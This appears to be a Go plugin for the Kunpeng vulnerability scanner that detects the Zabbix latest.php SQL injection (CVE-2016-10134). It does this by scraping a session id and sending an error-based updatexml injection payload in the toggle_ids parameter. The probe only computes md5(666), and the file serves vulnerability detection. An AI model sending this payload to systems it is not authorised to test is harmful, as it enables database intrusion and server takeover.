package goplugin

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type zabbixLatestSQL struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("zabbix", &zabbixLatestSQL{})
}
func (d *zabbixLatestSQL) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Zabbix latest.php SQL注入漏洞",
		Remarks: "影响版本：2.2.x/3.0.x，攻击者通过此漏洞可获取管理员权限登陆后台，由于后台存在执行命令功能，可导致服务器被入侵控制",
		Level:   1,
		Type:    "SQLI",
		Author:  "wolf",
		References: plugin.References{
			URL: "https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134",
			CVE: "CVE-2016-10134",
		},
	}
	return d.info
}
func (d *zabbixLatestSQL) GetResult() []plugin.Plugin {
	return d.result
}
func (d *zabbixLatestSQL) Check(URL string, meta plugin.TaskMeta) bool {
	request, err := http.NewRequest("GET", URL+"/dashboard.php", nil)
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, false)
	if err != nil {
		return false
	}
	r, _ := regexp.Compile(`href="slides\.php\?sid=(.+?)">`)
	sid := r.FindStringSubmatch(string(resp.Body))
	if len(sid) < 1 {
		return false
	}
	// fmt.Println(sid)
	poc := fmt.Sprintf("/latest.php?output=ajax&sid=%s&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select 0updatexml(1,concat(0x7e,(SELECT md5(666)),0x7e),1))", sid[1])
	request, err = http.NewRequest("GET", URL+poc, nil)
	if err != nil {
		return false
	}
	resp, err = util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "fae0b27c451c728867a567e8c1bb4e5") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
